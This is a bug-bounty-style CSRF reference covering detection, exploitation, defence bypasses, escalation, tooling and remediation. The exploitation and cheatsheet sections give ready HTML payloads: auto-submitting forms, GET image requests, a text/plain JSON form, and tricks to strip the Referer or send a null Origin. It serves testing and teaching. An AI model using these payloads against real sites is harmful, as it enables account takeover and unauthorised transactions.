# Cross-Site Request Forgery (CSRF)

CSRF tricks an authenticated victim's browser into sending a state-changing request to a target site where they're logged in. Because the browser auto-attaches cookies, the request executes with the victim's privileges — change email/password, transfer funds, add an admin, etc. Modern defenses (SameSite cookies, tokens) reduce but do not eliminate CSRF; the interesting bugs today are token/defense **bypasses**.

---

## Preconditions

1. A **state-changing** action worth attacking.
2. **Cookie-based** session handling (request auth rides on cookies automatically).
3. **Predictable request parameters** (no unguessable secret the attacker can't obtain).

---

## Detection

```text
- Find state-changing requests (POST/PUT/PATCH/DELETE; some GET).
- Is there an anti-CSRF token? Remove it / blank it / reuse another user's — still works?
- SameSite attribute on the session cookie? (Lax is default in modern browsers;
  None requires Secure; Strict blocks cross-site GET nav too.)
- Does the server validate Origin/Referer? Token tied to session?
- Can a top-level GET navigation trigger the action? (Lax allows GET nav.)
```

---

## Exploitation

### Basic auto-submitting POST PoC

```html
<html><body>
  <form action="https://TARGET/account/email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
  <script>document.forms[0].submit();</script>
</body></html>
```

### GET-based CSRF

```html
<img src="https://TARGET/account/transfer?to=attacker&amount=1000">
```

### JSON endpoint CSRF (Content-Type trick)

Browsers can't set arbitrary `Content-Type` cross-site with a simple form, but `text/plain` is allowed. If the server parses JSON loosely:

```html
<form action="https://TARGET/api/update" method="POST" enctype="text/plain">
  <input name='{"role":"admin","x":"' value='"}'>
</form>
```

This sends `{"role":"admin","x":"="}` ish as `text/plain`. If the API requires `application/json`, a true form CSRF is blocked — escalate via XSS or a Flash/CORS gadget.

---

## Defense bypasses (the real bug bounty value)

### Token bypasses

```text
- Token not tied to session  -> use your own valid token in victim's request.
- Token validated only if present -> delete the token param entirely.
- Token validated only when non-empty -> send token=  (empty).
- Token in cookie + body, server only checks they match ("double submit") but
  cookie is settable by the attacker (subdomain XSS, header injection) -> set both.
- Token sent in a custom header only -> if endpoint also accepts it as a param/cookie.
- Method change: POST requires token, but GET/PUT doesn't.
- Token leaks via Referer/log/URL -> harvest then forge.
```

### SameSite bypasses

```text
- Lax allows top-level GET navigation -> if a sensitive action accepts GET, a
  <a>/window.open/location works. Also "method override" (POST tunneled via GET).
- Lax 2-minute window: brand-new cookies are sent cross-site for ~120s after set
  (Chrome "Lax+POST" leniency) -> chain with a fresh login.
- SameSite=None -> fully cross-site, classic CSRF applies.
- Sibling subdomain (XSS/subdomain takeover) -> same-site to the cookie, bypass.
- Client-side redirect / gadget that turns cross-site into same-site.
```

### Referer/Origin-check bypasses

```text
- Referer check broken by omitting it: <meta name="referrer" content="no-referrer">
- Referer allowlist by substring: https://attacker.com/?target.com  /  target.com.evil.com
- Origin null: sandboxed iframe sends Origin: null -> if server allows null.
  <iframe sandbox="allow-scripts allow-forms" src="data:text/html,<form...>">
```

```html
<!-- Strip Referer entirely -->
<meta name="referrer" content="no-referrer">
<form action="https://TARGET/action" method="POST">...</form>
```

### Login CSRF & logout CSRF

Force the victim into the attacker's account (then capture their activity), or chain CSRF on the OAuth/SSO state parameter.

---

## Impact escalation

- Change victim email → trigger password reset → **account takeover**.
- Add attacker as admin / grant role (combine with the XSS nonce-harvest pattern).
- CSRF → stored XSS (CSRF posts a script-bearing field that later renders).
- Money movement, API key creation, deleting data.

---

## Tooling

| Tool | Use |
|------|-----|
| **Burp Suite** — "Generate CSRF PoC" (Engagement tools) | Auto-build form/JS PoC, including XHR & multipart |
| **Burp Repeater** | Test token removal / reuse / empty |
| **XSRFProbe** | Automated CSRF auditing |
| **Browser devtools** | Inspect SameSite, observe cross-site cookie behavior |

```bash
xsrfprobe -u https://TARGET --crawl
```

---

## Remediation

- Use **anti-CSRF tokens** that are per-session (or per-request), unpredictable, and validated server-side; reject missing/empty/mismatched.
- Set session cookies `SameSite=Lax` (or `Strict` for sensitive apps) + `Secure` + `HttpOnly`.
- Verify `Origin`/`Referer` for state-changing requests as defense-in-depth.
- For JSON APIs, require `Content-Type: application/json` and a custom header (e.g. `X-Requested-With`) that simple cross-site forms cannot set.
- Re-authenticate / require token for critical actions (email/password/funds).

---

## Cheatsheet

```text
# Auto-submit POST
<form action=https://T/x method=POST><input name=k value=v></form><script>forms[0].submit()</script>
# GET CSRF
<img src=https://T/transfer?to=me&amt=1000>
# JSON via text/plain
<form ... enctype="text/plain"><input name='{"role":"admin","x":"' value='"}'></form>
# Token bypasses
delete token param | token= (empty) | reuse your own token | swap POST->GET
# SameSite=Lax: use top-level GET nav (<a>, window.open, location)
# Strip Referer
<meta name=referrer content=no-referrer>
# Origin: null
<iframe sandbox="allow-scripts allow-forms" src="data:text/html,<form...>">
```

---

## References

- PortSwigger — CSRF: https://portswigger.net/web-security/csrf
- PortSwigger — Bypassing CSRF token validation: https://portswigger.net/web-security/csrf/bypassing-token-validation
- PortSwigger — SameSite bypasses: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions
- PayloadsAllTheThings — CSRF: https://swisskyrepo.github.io/PayloadsAllTheThings/CSRF%20Injection/
- HackTricks — CSRF: https://hacktricks.wiki/en/pentesting-web/csrf-cross-site-request-forgery.html
- OWASP CSRF Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
